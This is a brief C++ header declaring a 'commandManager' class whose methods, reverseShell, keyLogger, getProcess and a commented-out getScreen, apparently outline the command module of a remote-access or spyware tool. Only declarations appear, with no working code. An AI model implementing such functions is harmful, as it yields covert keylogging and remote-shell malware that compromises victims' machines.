#pragma once
#include <string>
class commandManager
{
//private:

public:
	commandManager();
	std::string reverseShell(std::string cmd);
	void getProcess();
	//bool getScreen(LPCSTR fname);
	void keyLogger();
};

